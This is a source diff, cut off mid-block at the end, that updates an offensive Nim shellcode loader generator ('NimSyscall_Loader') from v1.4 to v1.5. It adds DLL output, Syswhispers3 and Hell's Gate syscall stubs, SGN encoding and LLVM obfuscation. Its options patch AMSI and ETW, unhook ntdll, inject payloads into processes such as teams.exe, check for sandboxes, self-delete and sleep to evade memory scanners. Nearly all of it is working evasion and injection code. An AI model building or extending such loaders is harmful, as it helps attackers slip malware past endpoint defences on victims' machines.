@@ -9,16 +9,17 @@ import nimcrypto/sysrand
 import base64
 import strformat
 import strutils
+import sugar
 import os
 import osproc
 import docopt
-import std/math
 import random
 
 import HellsgateStubs
 import CustomEvasionStubs
 import GetSyscallStubs
 import SandboxStubs
+import Whispers
 
 
 from system import io
@@ -27,12 +28,9 @@ func toByteSeq*(str: string): seq[byte] {.inline.} =
   ## Converts a string to the corresponding byte sequence.
   @(str.toOpenArrayByte(0, str.high))
 
-proc toString(bytes: seq[byte]): string =
-  result = newString(bytes.len)
-  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)
 
 proc rndStr(length: int): string =
-  for _ in .. length:
+  for _ in 0.. length:
     add(result, char(rand(int('a') .. int('z'))))
 
 
@@ -43,7 +41,7 @@ let banner = """
  / /|  / / / / / / /__/ / /_/ (__  ) /__/ /_/ / / /    / /___/ /_/ / /_/ / /_/ /  __/ /    
 /_/ |_/_/_/ /_/ /_/____/\__, /____/\___/\__,_/_/_/____/_____/\____/\__,_/\__,_/\___/_/     
                        /____/                   /_____/      --> @ShitSecure
-                                                                 v1.4                                            
+                                                                 v1.5                                            
 
 """
 
@@ -52,10 +50,10 @@ echo banner
 #Handle arguments
 
 let helpmenu = """
-NimSyscall_Loader v 1.4
+NimSyscall_Loader v 1.5
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --x86]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --dll --dllexportfunc=<exportfuncname> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --x86 --llvm]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -64,14 +62,16 @@ Options:
   --version     Show version.
   --file filename  File to encrypt.
   --key key     Key to encrypt with
-  --output filename    Filename for encrypted exe
+  --output filename    Filename for encrypted exe/dll
+  --dll     Generate DLL instead of an exe
+  --dllexportfunc exportfuncname    Comma separated names of DLL custom export functions
   --COMVARETW    Block ETW by setting COMPlus_ETWEnabled to 0
   --noETW    Don't use ETW Patch
   --noAMSI    Don't patch AMSI
   --csharp    Encrypt a C# Assembly to load it on runtime
   --noArgs    Don't provide any arguments to the assembly (some can only run without args)
   --shellcode    Encrypt shellcode to load it on runtime
-  --sleep 10    Sleep 10 secconds before decryption to evade in memory scanners
+  --sleep 10    Sleep 10 seconds before decryption to evade in memory scanners
   --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
   --remoteprocess procname    Injects into the specified remote process name, e.g. teams.exe. The loader searches for the first process with that name
                      Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
@@ -84,6 +84,9 @@ Options:
   --peinject    Encrypt a PE to decrypt and run it on runtime as shellcode via donut
   --peload    Encrypt a PE to decrypt it on runtime and execute it via a syscall variant of Run-PE
   --hellsgate    Retrieve Syscalls via Hellsgate technique (for patching AMSI/ETW or shellcode execution/PE injection)
+  --syswhispers    Embed Syscalls via Syswhispers3 (NimLineWhispers3) technique
+  --jump    When using Syswhispers3, use the jumper_randomized technique
+  --sgn    Encode shellcode via SGN before encrypting it
   --replace    Replace common nim IoC's in the loader like the string 'nim'
   --sandbox value    Include Sandbox Checks of your choice into the loader:
                      Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
@@ -98,6 +101,7 @@ Options:
   --obfuscatefunctions    Obfuscate some Nim specific Windows API's from the IAT via CallObfuscator (https://github.com/d35ha/CallObfuscator - only possible from a Windows OS)
   --debug    Compiles the binary in debug mode (More DInvoke output)
   --x86    (Compiles an x86 binary - have to cast some more function values before this works smoothly)
+  --llvm    Add compiler flags for LLVM obfuscation, you have to set it up by yourself
 """
 
 if (paramCount() == 0):
@@ -112,6 +116,9 @@ var
     packerPath = os.getAppDir()
     outfile: string = packerPath
     envkey: string = "TARGETDOMAIN"
+    dll_out: bool = false
+    dllfunc: string = ""
+    dllexportfunctions: seq[string]
     remoteprocesses : seq[string]
     targetdomain : string = ""
     processname: string = ""
@@ -126,6 +133,7 @@ var
     localinject: bool = true
     unhook: bool = false
     denim: bool = false
+    llvm: bool = false
     gosleep: bool = false
     sleeptime: int = 0
     reflective: bool = false
@@ -135,9 +143,11 @@ var
     peload: bool = false
     callobfs: bool = false
     hellsgate: bool = false
+    syswhispers: bool = false
+    jump: bool = false
+    sgn: bool = false
+    getfreshstub: bool = true
     selfdelete: bool = false
-    remoteprocess: string = ""
-    remoteprocessesstring: string
     remoteAMSIpatch: bool = false
     remoteETWpatch: bool = false
     replace: bool = false
@@ -147,12 +157,7 @@ var
     debugMode: bool = false
     compileX86: bool = false
 
-when system.hostOS == "windows":
-    outfile.add("\\Loader.exe")
-else:
-    outfile.add("/Loader.exe")
-
-let args = docopt(helpmenu, version = "NimSyscall_Loader 1.4")
+let args = docopt(helpmenu, version = "NimSyscall_Loader 1.5")
 
 if args["--file"]:
   let fname = args["--file"]
@@ -162,6 +167,42 @@ if args["--file"]:
 if args["--key"]:
   let keyname = args["--key"]
   envkey = fmt"{keyname}"
+
+if args["--shellcode"]:
+  shellcode = true
+  csharp = false
+  peload = false
+
+if args["--csharp"]:
+  csharp = true
+  shellcode = false
+  peload = false
+
+if args["--peload"]:
+  peload = true
+  shellcode = false
+  csharp = false
+
+if args["--dll"]:
+  dll_out = true
+  if peload == true:
+    echo "Warning: Argument passing to the PE will fail as the first argument is rundll32.exe or regsvr32.exe"
+
+if args["--dllexportfunc"]:
+  let dllfuncstring = args["--dllexportfunc"]
+  dllfunc = fmt"{dllfuncstring}"
+  dllexportfunctions = dllfunc.split(',')
+  
+when system.hostOS == "windows":
+    if(dll_out):
+        outfile.add("\\Loader.dll")
+    else:
+        outfile.add("\\Loader.exe")
+else:
+    if(dll_out):
+        outfile.add("/Loader.dll")
+    else:
+        outfile.add("/Loader.exe")
 
 if args["--output"]:
   let outname = args["--output"]
@@ -180,10 +221,6 @@ if args["--remotepatchAMSI"]:
 if args["--remotepatchETW"]:
   remoteETWpatch = true
 
-if args["--csharp"]:
-  csharp = true
-  shellcode = false
-
 if args["--noAMSI"]:
   AMSI = false
 
@@ -193,14 +230,10 @@ if args["--noETW"]:
 if args["--COMVARETW"]:
   COMVARETW = true
 
-if args["--shellcode"]:
-  shellcode = true
-
 if args["--unhook"]:
   unhook = true
 
 if args["--sleep"]:
-  let sleeparg = args["--sleep"]
   sleeptime = parse_int($args["--sleep"])
   sleeptime = (sleeptime)
   gosleep = true
@@ -214,6 +247,9 @@ if args["--reflective"]:
 if args["--obfuscate"]:
   denim = true
 
+if args["--llvm"]:
+  llvm = true
+
 if args["--hide"]:
   hide = true
 
@@ -223,12 +259,20 @@ if args["--noArgs"]:
 if args["--peinject"]:
   peinject = true
 
-if args["--peload"]:
-  peload = true
-
 if args["--hellsgate"]:
   hellsgate = true
-  shellcode = false
+  getfreshstub = false
+
+if args["--syswhispers"]:
+  syswhispers = true
+  getfreshstub = false
+
+if args["--jump"]:
+  syswhispers = true
+  jump = true
+
+if args["--sgn"]:
+  sgn = true
 
 if args["--replace"]:
   replace = true
@@ -263,22 +307,40 @@ if args["--x86"]:
 
 var blob: string
 #Read file and if PE convert to shellcode before
-if (shellcode):
-    if (peinject):
-        when system.hostOS == "windows":
-            var exist: bool = existsFile("donut.exe")
-        else:
-            var exist: bool = true
-        if (exist):
-            when system.hostOS == "windows":
-                discard os.execShellCmd(fmt"donut -f {filename} -b 1 -o tmpshellcode.bin")
-            elif system.hostOS == "linux":
-                discard os.execShellCmd(fmt"donut {filename} -b 1 -o tmpshellcode.bin")
-            blob = readFile("tmpshellcode.bin")
-        else:
-            echo fmt"'Donut' not found. You need to download/install according to the README"
+if (peinject):
+    when system.hostOS == "windows":
+        var exist: bool = fileExists(fmt"{packerPath}\donut\donut.exe")
     else:
-        blob = readFile(filename)
+        var exist: bool = true
+    if (exist):
+        when system.hostOS == "windows":
+            discard os.execShellCmd(fmt"{packerPath}\donut\donut -b 1 -o tmpshellcode.bin --input:{filename}")
+            if (sgn):
+                if (compileX86):
+                    discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -c 3  -o tmpshellcode.bin tmpshellcode.bin")
+                else:
+                    discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -a 64 -c 3  -o tmpshellcode.bin tmpshellcode.bin")
+                sgn = false
+        elif system.hostOS == "linux":
+            discard os.execShellCmd(fmt"donut {filename} -b 1 -o tmpshellcode.bin")
+            if (sgn):
+                if (compileX86):
+                    discard os.execShellCmd(fmt"{packerPath}\sgn\sgn -c 3  -o tmpshellcode.bin tmpshellcode.bin")
+                else:
+                    discard os.execShellCmd(fmt"{packerPath}\sgn\sgn -a 64 -c 3  -o tmpshellcode.bin tmpshellcode.bin")
+                sgn = false
+        blob = readFile("tmpshellcode.bin")
+        shellcode = true
+        peload = false
+    else:
+        echo fmt"'Donut' not found. You need to download/install according to the README"
+        quit()
+elif(sgn):
+    if (compileX86):
+        discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -c 3  -o tmpshellcode.bin {filename}")
+    else:
+        discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -a 64 -c 3  -o tmpshellcode.bin {filename}")
+    blob = readFile("tmpshellcode.bin")
 else:
     blob = readFile(filename)
 
@@ -305,14 +367,11 @@ ectx.init(key, iv)
 ectx.encrypt(plaintext, enctext)
 ectx.clear()
 
-
 #let encoded = encode(enctext)
 echo "Writing encrypted blob to disk: "
 
-var nameoffile: string = "enc.blob"
 var content: string = cast[string](enctext)
 writeFile("enc.blob", content)
-
 
 let encodedIV = encode(iv)
 let encodedenvkey = encode(envkey)
@@ -322,21 +381,30 @@ let RemoteProcImportStub = """
 import osproc
 """
 
-
 let AssemblyImports = """
 from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR
 """
 
 let LoadAssemblyStub = """
-
 var assembly = load(dectext)
+
+from os import paramCount,paramStr
+
+when defined(lib_only):
+    # https://stackoverflow.com/questions/12161813/running-a-dll-using-rundll32-exe-no-output-or-error-seen
+    # https://stackoverflow.com/questions/432832/what-is-the-different-between-api-functions-allocconsole-and-attachconsole-1 to get DLL Console output
+    AttachConsole(-1)
 
 var cmd: seq[string]
 var i = 1
 while i <= paramCount():
-    cmd.add(paramStr(i))
+    when defined(lib_only):
+        if (i != 1):
+            # first parameter is rundll32.exe,Funcname (skip that)
+            cmd.add(paramStr(i))
+    else:
+        cmd.add(paramStr(i))
     inc(i)
-
 """
 
 let LoadAssemblyStubArgs = """
@@ -345,10 +413,8 @@ assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
 """
 
 let LoadAssemblyStubNoArgs = """
-
 var arr = toCLRVariant([""], VT_BSTR) # Passing no arguments
 assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
-
 """
 
 let WinLeanGetCurrentProcStub = """
@@ -360,7 +426,7 @@ let Winimleanstub = """
 import winim/lean
 """
 
-let SleepStubSeccond * = fmt"""
+let SleepStubSecond * = fmt"""
 echo obf("[*] Sleeping to avoid in memory scanners")
 echo {sleeptime}
 HowMuchTimeWouldYoulikeToSleep({sleeptime}) 
@@ -383,9 +449,9 @@ import winim/lean
 #from dynlib import LibHandle, loadLib
 # something seams to be still missing here
 #from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR,LPDWORD,WINBOOL,TRUE,FALSE,HMODULE,LPOVERLAPPED, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, PROCESS_ALL_ACCESS, FALSE, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES
-import dynlib
+#from winim/lean import FARPROC,NtClose
+#from winim import winstr,winimbase,windef
 import strformat
-from os import paramCount, paramStr
 from nimcrypto import CTR, aes256, sizeKey, sizeBlock, sha256, digest, init, update, finish, clear, decrypt, encrypt
 import base64
 import strutils
@@ -447,7 +513,7 @@ let Cryptstub3 = fmt"""
 # Decode and save IV
 copyMem(addr iv[0], addr pp[0], len(pp))
 
-# Ecnrypt Key
+# Encrypt Key
 var expandedkey = sha256.digest(envkey)
 copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))
 
@@ -496,11 +562,11 @@ proc GetRemoteProcAddress * (hProcess : HANDLE, hModule : HMODULE, FuncName : st
         ExportTable : DWORD = 0
         ExportFunctionTableVA : UINT_PTR = 0
         ExportNameTableVA : UINT_PTR = 0
-        ExportOrdinalTableVA  : UINT_PTR = 0
+        ExportOrdinalTableVA : UINT_PTR = 0
         ExportNameTable: seq[DWORD]
         ExportFunctionTable: seq[DWORD]
         ExportOrdinalsTable: seq[WORD] 
-        MinFunNumber : UINT_PTR  = 0
+        MinFunNumber : UINT_PTR = 0
         Func : DWORD = 0
         Ord : WORD = 0
         CharIndex : UINT_PTR = 0
@@ -563,13 +629,13 @@ proc GetRemoteProcAddress * (hProcess : HANDLE, hModule : HMODULE, FuncName : st
 
 """
 
-proc genEnglishwords (nuofWords: int): string =
 
+proc genEnglishwords (nuofWords: int): string =
 
   proc pumpenglishwords (numberofWords: int): seq[string] =
 
     var englishdicts: seq[string]
-    var output: seq[string]    
+    var output: seq[string]
     var dictionary: string
     when system.hostOS == "windows":
         dictionary = fmt"{packerPath}\\Dicts\\englishwords.txt"
@@ -582,7 +648,7 @@ proc genEnglishwords (nuofWords: int): string =
     return output
 
   proc rndStr: string =
-    for _ in .. 10:
+    for _ in 0.. 10:
       add(result, char(rand(int('a') .. int('z'))))
     
   var rand1: seq[string] = pumpenglishwords(nuofWords)
@@ -595,13 +661,13 @@ var {rand2} = {rand1}
 """
   return englishwordsstub
 
-proc genTrustedwords (nuofWords: int): string =
 
+proc genTrustedwords (nuofWords: int): string =
 
   proc pumpTrustedwords (numberofWords: int): seq[string] =
 
     var trusteddicts: seq[string]
-    var output: seq[string]    
+    var output: seq[string]
     var dictionary: string
     when system.hostOS == "windows":
         dictionary = fmt"{packerPath}\\Dicts\\trustedStrings.txt"
@@ -614,7 +680,7 @@ proc genTrustedwords (nuofWords: int): string =
     return output
 
   proc rndStr: string =
-    for _ in .. 10:
+    for _ in 0.. 10:
       add(result, char(rand(int('a') .. int('z'))))
     
   var rand1: seq[string] = pumpTrustedwords(nuofWords)
@@ -628,8 +694,49 @@ var {rand2} = {rand1}
 
   return trustedwordsstub
 
+let DllStub = """
+import dynlib
+proc NimMain() {.cdecl, importc.}
+
+proc DllRegisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
+    NimMain()
+    return true
+
+proc DllUnregisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
+    NimMain()
+    return true
+
+proc DllInstall(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
+    NimMain()
+    return true
+"""
+
+let DllCustomExportStub = """
+proc FUNC_EXPORT(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
+    NimMain()
+    return true
+"""
+
+let DllStubRemoteInj = """
+import dynlib
+proc DllRegisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
+    return true
+
+proc DllUnregisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
+    return true
+
+proc DllInstall(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
+    return true
+"""
+
+let DllCustomExportStubRemoteInj = """
+proc FUNC_EXPORT(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
+    return true
+"""
+
 var stub = Cryptstub1
 stub.add(DInvokeBaseStub)
+
 if(pump):
     # makes no sense to import strenc when strings should be visible in the binary.
     stub =  stub.replace("import strenc", "")
@@ -640,11 +747,6 @@ if(pump):
         if (m == "reputation"):
             echo "[*] Adding reputation"
             stub.add(genTrustedwords(rand(3500..6200)))
-
-if (selfdelete):
-    stub.add(DInvokeLoadLibraryAGetProcAddress)
-    stub.add(DInvokeSelfDeleteStubs)
-    stub.add(FileDeleteStub)
 
 if(sandbox):
     stub.add(DInvokeSandBoxStub)
@@ -661,216 +763,218 @@ if(sandbox):
 
 if(gosleep):
     stub.add(SleepStubFirst)
-    stub.add(SleepStubSeccond)
+    stub.add(SleepStubSecond)
 
+
+if (getfreshstub):
+    stub.add(GetSyscallStub)
+    stub.add(NtProtectSyscallStart)
+
+if (syswhispers):
+    if(jump):
+        stub.add(WhispersJumpStub)
+    else:
+        stub.add(WhispersStub)
 
 if(unhook):
     if(hellsgate):
         stub.add(DInvokeUnhookStubs)
         stub.add(Winimleanstub)
+        stub.add(WinLeanGetCurrentProcStub)
         stub.add(HellsgateStub)
         stub.add(HellsgateProtectDelegate)
         stub.add(HellsgateWriteDelegate)
         stub.add(HellsgateNtCloseDelegate)
         stub.add(HellsgateUnhookStub)
-    else:
+    elif(getfreshstub):
         stub.add(DInvokeUnhookStubs)
         stub.add(Winimleanstub)
-        stub.add(GetSyscallStub)
         stub.add(NtProtectVirtualMemoryDelegate)
         stub.add(NtWriteVirtualMemoryDelegate)
         stub.add(NtCloseDelegate)
-        stub.add(NtProtectSyscallStart)
         stub.add(UnhookSyscalls)
         stub.add(UnhookStub)
+    elif(syswhispers):
+        stub.add(DInvokeUnhookStubs)
+        stub.add(Winimleanstub)
+        stub.add(WhispersUnhookStub)
+else:
+    if(hellsgate):
+        stub.add(WinLeanGetCurrentProcStub)
+        stub.add(HellsgateStub)
+        stub.add(HellsgateProtectDelegate)
+        stub.add(HellsgateWriteDelegate)
+        stub.add(HellsgateNtCloseDelegate)
+    elif(getfreshstub):
+        stub.add(NtProtectVirtualMemoryDelegate)
+        stub.add(NtWriteVirtualMemoryDelegate)
 
 # Only decrypt when sandbox Checks/Unhooking/Sleep is done
-stub = stub & Cryptstub2 & Cryptstub3
+stub.add(Cryptstub2)
+stub.add(Cryptstub3)
+
+if (AMSI or ETW or peload or (localinject == false) or selfdelete):
+    stub.add(DInvokeLoadLibraryAGetProcAddress)
+    if (selfdelete):
+        stub.add(DInvokeSelfDeleteStubs)
+        stub.add(FileDeleteStub)
+
+if (localinject):
+    if (AMSI):
+        if (syswhispers):
+            stub.add(WhispersAMSIPatchStub)
+        if (hellsgate):
+            stub.add(HellsgateAMSIPatchStub)
+        elif(getfreshstub):
+            stub.add(AMSIStub)
+    if (ETW):
+        if (COMVARETW):
+            stub.add(ETWCOMVARStub)
+        else:
+            if (syswhispers):
+                stub.add(WhispersETWPatchStub)
+            if (hellsgate):
+                stub.add(HellsgateETWPatchStub)
+            elif(getfreshstub):
+                stub.add(ETWPatchStub)
 
 if (remoteETWpatch or remoteAMSIpatch):
     stub.add(RemoteModuleHandleStub)
-
-if (AMSI or ETW or peload or (localinject == false)):
-    if ("LoadLibraryA_t* = proc" in stub) == false:
-        stub.add(DInvokeLoadLibraryAGetProcAddress)
-
-if (hellsgate): 
-    stub.add(WinLeanGetCurrentProcStub)
-    if ("https://doxygen.reactos.org/d3/d71/struct__ASSEMBLY__STORAGE__MAP__ENTRY.html" in stub) == false:
-        stub.add(HellsgateStub)
-    if ("NtWriteVirtualMemory(P" in stub) == false:
-        stub.add(HellsgateWriteDelegate)
-    if (AMSI):
-        if ("NtProtectVirtualMemory(" in stub) == false:
-            stub.add(HellsgateProtectDelegate)
-        stub = stub &  HellsgateAMSIPatchStub
-        if(ETW):
-            if (COMVARETW):
-                stub = stub & ETWCOMVARStub
-            else:
-                stub = stub & HellsgateETWPatchStub
-    else:
-        if(ETW):
-            if (COMVARETW):
-                stub = stub & ETWCOMVARStub
-            else:
-                if ("NtProtectVirtualMemory(" in stub) == false:
-                    stub.add(HellsgateProtectDelegate)
-                stub = stub & HellsgateETWPatchStub
-    if (peload):
-        if ("NtAllocateVirtualMemory(" in stub) == false:
-            stub.add(HellsgateAllocDelegate)
-        stub.add(HellsPELoadStub)
-        peload = false
-        localinject = false
-    if(localinject and (csharp == false)):
-        if ("NtAllocateVirtualMemory(" in stub) == false:
-            stub.add(HellsgateAllocDelegate)
-        stub = stub & HellsgateLocalInjectStub
-    if ((localinject == false) and (csharp == false) and (("fixIAT*(m" in stub) == false)):
-        stub.add(RemoteProcImportStub)
-        if ("NtOpenProcess(" in stub) == false:
-            stub.add(HellsgateNtOpenProcessDelegate)
-        if ("NtAllocateVirtualMemory(" in stub) == false:
-            stub.add(HellsgateAllocDelegate)
-        if ("NtCreateThreadEx(" in stub) == false:
-            stub.add(HellsgateNtCreateThreadExDelegate)
-        if ("NtClose(" in stub) == false:
-            stub.add(HellsgateNtCloseDelegate)
-        if (processname == ""):
-            stub = stub & HellsgateNotepadProcIDStub & DInvokeGetModuleHandleADelegate
-            stub.add(SleepStubFirst)
-            if (remoteETWpatch):
-                if ("NtProtectVirtualMemory(" in stub) == false:
-                    stub.add(HellsgateProtectDelegate)
-                stub.add(HellsgateRemotePatchETWStub)
-            if (remoteAMSIpatch):
-                if ("NtProtectVirtualMemory(" in stub) == false:
-                    stub.add(HellsgateProtectDelegate)
-                stub.add(HellsgateRemotePatchAMSIStub)
-            stub.add(HellsShellcoderemoteinjectStub_notepad)
-            stub.add(HellsShellcoderemoteinjectStub)  
-        else:
-            stub = stub & HellsShellcoderemoteinjectStub_customprocfirst & ShellcoderemoteinjectStub_customprocseccond & HellsShellcoderemoteinjectStub_customprocID
-            if (remoteETWpatch):
-                if ("NtProtectVirtualMemory(" in stub) == false:
-                    stub.add(HellsgateProtectDelegate)
-                stub.add(HellsgateRemotePatchETWStub)
-            if (remoteAMSIpatch):
-                if ("NtProtectVirtualMemory(" in stub) == false:
-                    stub.add(HellsgateProtectDelegate)
-                stub.add(HellsgateRemotePatchAMSIStub) 
-            stub = stub & HellsShellcoderemoteinjectStub_customprocthird & HellsShellcoderemoteinjectStub
-    if (csharp):
-        stub.add(AssemblyImports)
-        echo "adding Stub:"
-        if (noArgs):
-            stub.add(LoadAssemblyStub)
-            stub.add(LoadAssemblyStubNoArgs)
-        else:
-            stub.add(LoadAssemblyStub)
-            stub.add(LoadAssemblyStubArgs)
-        csharp = false
-if (peload):
-    if ("PS_ATTR_UNION" in stub) == false:
-        stub.add(GetSyscallStub)
-    if ("myNtProtectVirtM = pro" in stub) == false:
-        stub.add(NtProtectVirtualMemoryDelegate)
-        stub.add(NtProtectSyscallStart)
-    if ("myNtWriteVirtM = proc" in stub) == false:
-        stub.add(NtWriteVirtualMemoryDelegate)
-    if (AMSI):
-        stub = stub & AMSIStub
-        if(ETW):
-            if (COMVARETW):
-                stub = stub & ETWCOMVARStub
-            else:
-                stub = stub & ETWPatchStub
-    else:
-        if(ETW):
-            if (COMVARETW):
-                stub = stub & ETWCOMVARStub
-            else:
-                stub = stub & ETWPatchStub
-
-    if ("myNtAllocateVirtM = pro" in stub) == false:
-        stub.add(NtAllocateVirtualMemoryDelegate)
-    stub.add(ProtectWriteAllocSyscalls)
-    stub.add(PELoadStub)
-    shellcode = false
-if (shellcode):
-    if ("PS_ATTR_UNION" in stub) == false:
-        stub.add(GetSyscallStub)
-    if (AMSI or ETW or remoteETWpatch or remoteAMSIpatch):
-        if ("myNtProtectVirtM = pro" in stub) == false:
-            stub.add(NtProtectVirtualMemoryDelegate)
-            stub.add(NtProtectSyscallStart)
-        if ("myNtWriteVirtM = proc" in stub) == false:
-            stub.add(NtWriteVirtualMemoryDelegate)
-    if (AMSI):
-        stub = stub &  AMSIStub
-        if(ETW):
-            if (COMVARETW):
-                stub = stub & ETWCOMVARStub
-            else:
-                stub = stub & ETWPatchStub
-    else:
-        if(ETW):
-            if (COMVARETW):
-                stub = stub & ETWCOMVARStub
-            else:
-                stub = stub & ETWPatchStub
-    if(localinject):
-        stub = stub & LocalInjectDelegates & ShellcodelocalStub
-    else:
-        stub.add(RemoteProcImportStub)
+    if (gosleep == false):
+        stub.add(SleepStubFirst)
+    if (unhook == false):
         stub.add(DInvokeGetModuleHandleADelegate)
-        if (processname == ""):
-            stub = stub & RemoteInjectDelegates & NotepadProcIDStub
-            stub.add(SleepStubFirst)
-            if (remoteETWpatch):
-                stub.add(RemoteLoadNTDLLStub)
-                stub.add(RemotePatchETWStub)
-            if (remoteAMSIpatch):
-                stub.add(RemoteLoadAMSIStub)
-                stub.add(RemotePatchAMSIStub)
-            stub = stub & ShellcoderemoteinjectStub_notepad & ShellcoderemoteinjectStub  
-        else:
-            stub = stub & RemoteInjectDelegates & ShellcoderemoteinjectStub_customprocfirst & ShellcoderemoteinjectStub_customprocseccond & ShellcoderemoteinjectStub_customprocID
-            if (remoteETWpatch):
-                stub.add(RemoteLoadNTDLLStub)
-                stub.add(RemotePatchETWStub)
-            if (remoteAMSIpatch):
-                stub.add(RemoteLoadAMSIStub)
-                stub.add(RemotePatchAMSIStub)
-            stub = stub & ShellcoderemoteinjectStub_customprocthird & ShellcoderemoteinjectStub
+
+if(dll_out):
+    if (processname == ""):
+        stub.add(DllStub)
+        for f in dllexportfunctions:
+            stub.add(DllCustomExportStub)
+            stub = stub.replace("FUNC_EXPORT", f)
+    else:
+        stub.add(DllStubRemoteInj)
+        for f in dllexportfunctions:
+            stub.add(DllCustomExportStubRemoteInj)
+            stub = stub.replace("FUNC_EXPORT", f)
+
+if (peload):
+    if (localinject):
+        if (hellsgate):
+            stub.add(HellsgateAllocDelegate)
+            stub.add(HellsPELoadStub)
+        elif(getfreshstub):
+            stub.add(NtAllocateVirtualMemoryDelegate)
+            stub.add(ProtectWriteAllocSyscalls)
+            stub.add(PELoadStub)
+        elif(syswhispers):
+            stub.add(WhispersPELoadStub)
+    else:   
+        stub.add(RemoteProcImportStub)
+        if (hellsgate):
+            stub.add(HellsgateNtOpenProcessDelegate)
+            stub.add(HellsgateAllocDelegate)
+            stub.add(HellsgateNtCreateThreadExDelegate)
+            if (processname == ""):
+                stub.add(HellsgateNotepadProcIDStub)
+                if (remoteETWpatch):
+                    stub.add(HellsgateRemotePatchETWStub)
+                if (remoteAMSIpatch):
+                    stub.add(HellsgateRemotePatchAMSIStub)
+                stub.add(HellsShellcoderemoteinjectStub_notepad)
+                stub.add(HellsShellcoderemoteinjectStub)
+            else:
+                stub.add(HellsShellcoderemoteinjectStub_customprocfirst)
+                stub.add(ShellcoderemoteinjectStub_customprocseccond)
+                stub.add(HellsShellcoderemoteinjectStub_customprocID)
+                if (remoteETWpatch):
+                    stub.add(HellsgateRemotePatchETWStub)
+                if (remoteAMSIpatch):
+                    stub.add(HellsgateRemotePatchAMSIStub)
+                stub.add(HellsShellcoderemoteinjectStub_customprocthird)
+                stub.add(HellsShellcoderemoteinjectStub)
+
+if (shellcode):
+    if (localinject):
+        if (getfreshstub):
+            stub.add(LocalInjectDelegates)
+            stub.add(ShellcodelocalStub)
+        if (hellsgate):
+            stub.add(HellsgateAllocDelegate)
+            stub.add(HellsgateLocalInjectStub)
+        elif(syswhispers):
+            stub.add(WhispersLocalInjectStub)
+    else:
+        stub.add(Winimleanstub)
+        if (getfreshstub):
+            stub.add(RemoteProcImportStub)
+        if (hellsgate):
+            stub.add(HellsgateNtOpenProcessDelegate)
+            stub.add(HellsgateAllocDelegate)
+            stub.add(HellsgateNtCreateThreadExDelegate)
+            if (processname == ""):
+                stub.add(HellsgateNotepadProcIDStub)
+                if (remoteETWpatch):
+                    stub.add(HellsgateRemotePatchETWStub)
+                if (remoteAMSIpatch):
+                    stub.add(HellsgateRemotePatchAMSIStub)
+                stub.add(HellsShellcoderemoteinjectStub_notepad)
+                stub.add(HellsShellcoderemoteinjectStub)
+            else:
+                stub.add(HellsShellcoderemoteinjectStub_customprocfirst)
+                stub.add(ShellcoderemoteinjectStub_customprocseccond)
+                stub.add(HellsShellcoderemoteinjectStub_customprocID)
+                if (remoteETWpatch):
+                    stub.add(HellsgateRemotePatchETWStub)
+                if (remoteAMSIpatch):
+                    stub.add(HellsgateRemotePatchAMSIStub)
+                stub.add(HellsShellcoderemoteinjectStub_customprocthird)
+                stub.add(HellsShellcoderemoteinjectStub)
+        elif(syswhispers):
+            if (processname == ""):
+                stub.add(WhispersNotepadProcIDStub)
+                if (remoteETWpatch):
+                    stub.add(WhispersRemotePatchETWStub)
+                if (remoteAMSIpatch):
+                    stub.add(WhispersRemotePatchAMSIStub)
+                stub.add(WhispersShellcoderemoteinjectStub_notepad)
